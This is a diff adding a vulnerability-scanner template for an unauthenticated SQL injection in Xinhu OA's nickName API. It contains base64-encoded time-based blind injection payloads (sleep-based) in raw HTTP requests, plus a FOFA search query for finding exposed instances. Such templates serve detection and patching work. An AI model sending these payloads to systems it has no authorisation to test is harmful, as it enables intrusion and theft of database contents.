@@ -1,0 +1,38 @@
+id: xinhuOA-nickName-sql
+
+info:
+  name: "信呼 OA nickName 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="信呼-OA系统"
+      该漏洞源于信呼OA系统nickName接口未正确过滤用户输入参数，攻击者可通过该漏洞在未认证状态下执行恶意SQL语句，导致数据库信息泄露（如管理员凭证、用户敏感数据）及服务器权限提升风险。漏洞利用可能触发数据库元数据枚举、敏感表数据导出，或通过带外技术实现反向连接。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485918&idx=1&sn=f1ffea054e8a84ea9d962d2bec81f149&chksm=c267bcedf51035fb6af2ac2f46c39b6bc613de256bc88cd38c3270c1a91bacd3c4f9c24c025d&token=1619136955&lang=zh_CN#rd
+  tags: 信呼OA
+
+
+http:
+- raw:
+  - |
+    GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDQpIw== HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  - |
+    GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDgpIw== HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
